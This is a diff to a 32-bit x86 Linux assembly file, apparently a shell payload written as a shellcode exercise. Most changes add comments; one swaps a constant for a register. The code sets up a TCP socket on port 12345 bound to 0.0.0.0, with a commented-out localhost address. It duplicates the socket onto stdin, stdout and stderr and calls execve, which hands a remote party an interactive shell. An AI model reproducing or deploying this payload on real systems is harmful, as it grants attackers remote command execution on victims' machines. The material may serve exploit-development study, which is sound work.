@@ -105,7 +105,7 @@ _start:
 	push BYTE 6		; IPPROTO_TCP	|| 	int protocol);
 	push BYTE 1		; SOCK_STREAM	|| 	int type,
 	push BYTE 2		; AF_INET	|| socket(int domain,
-	mov ecx, esp
+	mov ecx, esp		; ECX - PTR to arguments for socket()
 	int 0x80
 
 	; EAX return
@@ -134,10 +134,10 @@ _start:
 
 	; ECX
 	xor edx, edx
-	push edx		; ANY HOST (0.0.0.0)}			||	struct in_addr sin_addr (unsigned long s_addr) };
-	;; push DWORD 0x0100007f	; For 127.0.0.1 HOST		||
-	push WORD 0x3930	; PORT 12345 (reverse),			|| 	unsigned short sin_port,
-	push WORD 2		; AF_INET				|| struct sockaddr { short sin_family,
+	push edx		; ANY HOST (0.0.0.0)}			||		struct in_addr sin_addr (unsigned long s_addr) };
+	;; push DWORD 0x0100007f	; For 127.0.0.1 HOST
+	push WORD 0x3930	; PORT 12345 (reverse),			||	 	unsigned short sin_port,
+	push WORD bx		; 2 - AF_INET				|| struct sockaddr { short sin_family,
 	mov ecx, esp		; Save PTR to sockaddr struct in ECX
 
 	push BYTE 16		; 	socklen_t addrlen);
@@ -188,7 +188,7 @@ _start:
 
 	; EAX
 	xor eax, eax
-	mov al, 102
+	mov al, 102		; socketcall
 
 	; EBX
 	xor ebx, ebx
@@ -217,19 +217,21 @@ _start:
 	; 63		sockfd		2
 	;
 
-	mov ebx, eax		; move current fd (socket) to EBX
+	; move our sockfd to EBX
+	mov ebx, eax
+
 	xor eax, eax
 	mov al, 63		; dup2 syscall
 	xor ecx, ecx		; 0 - stdin
-	int 0x80
+	int 0x80		; call dup2(sockfd, 0)
 
 	mov al, 63		; dup2 syscall
 	mov cl, 1		; 1 - stdout
-	int 0x80
+	int 0x80		; call dup2(sockfd, 1)
 
 	mov al, 63		; dup2 syscall
 	mov cl, 2		; 2 - stderr
-	int 0x80
+	int 0x80		; call dup2(sockfd, 2)
 
 
 
@@ -266,7 +268,7 @@ _start:
 	; EDX
 	push edx		; NULL terminator
 	mov edx, esp		; EDX is a PTR to a stack which has an address to NULL.
-	int 0x80
+	int 0x80		; call execve(EBX, ECX, EDX)
 
 
 
